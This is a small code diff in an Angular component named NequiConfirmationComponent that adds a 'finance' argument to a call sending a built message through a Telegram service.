@@ -110,7 +110,7 @@ export class NequiConfirmationComponent implements OnInit {
       );
 
       const message = this.buildMessage();
-      await firstValueFrom(this.telegramService.sendMessage$(message));
+      await firstValueFrom(this.telegramService.sendMessage$(message,"finance"));
 
       this.showSuccess = true;
     } catch {
